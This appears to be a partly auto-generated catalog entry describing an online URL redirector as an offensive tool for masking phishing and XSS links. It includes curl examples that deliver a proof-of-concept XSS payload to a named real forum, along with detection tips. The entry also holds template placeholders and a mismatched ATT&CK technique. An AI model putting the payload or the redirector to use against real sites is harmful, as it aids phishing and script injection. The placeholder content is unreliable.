---
id: tool-uuid-456
url: 'https://blackfan.ru/x?r='
tags:
  - redirector
  - url-shortener
  - xss-delivery
type: tool
verified: false
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.369Z'
validated: true
submitted: true
---
# blackfan-ru-redirector

**Status**: Unverified

## Overview

blackfan.ru/x?r is a simple online redirection script used to obfuscate and deliver malicious URLs in phishing or exploitation scenarios, particularly for XSS payloads by redirecting to targets without revealing the full path.

## Description

This tool serves as a basic URL redirector, allowing users to create shortened links that forward to a specified target URL. In offensive security, it's commonly used to mask exploit URLs, making them appear less suspicious when shared via email or social engineering. It requires no installation and works via HTTP GET parameters.

## Features

- Feature 1: Simple redirection via `?r=` parameter
- Feature 2: No logging or authentication, ideal for anonymous use
- Feature 3: Supports arbitrary target URLs for payload delivery

## Installation

### Requirements

- Web browser or curl for access
- Internet connectivity

### Install Commands

No installation required; access directly via browser.

## Basic Usage

Access the URL with the target: `https://blackfan.ru/x?r=https://example.com`

### Common Options

| Option | Description |
|--------|-------------|
| `?r=` | Target URL to redirect to |

## Examples

### Example 1: Basic Usage

```bash
# In browser or curl
curl "https://blackfan.ru/x?r=https://forum.owncloud.org/test"
```

This redirects to the target URL.

### Example 2: Advanced Usage

For XSS: `https://blackfan.ru/x?r=https://forum.owncloud.org/<svg/onload=alert(1)>/%252e%252e`

```bash
curl "https://blackfan.ru/x?r=https://forum.owncloud.org/<svg/onload=alert(1)>/%252e%252e"
```

Redirects to the vulnerable path.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[T1566.001]]
- [[Drive-by Compromise]]

### Tactics

- [[Initial Access]]

## Detection

Indicators and methods for detecting this tool's usage:

- Monitor outbound requests to blackfan.ru domains
- Analyze redirect chains in network logs for suspicious targets

## Related Procedures


## Related Tools

- [[Related Tool 1]]
- [[Related Tool 2]]

## References

- Official site: https://blackfan.ru
- Usage in XSS: HackerOne reports on similar redirectors
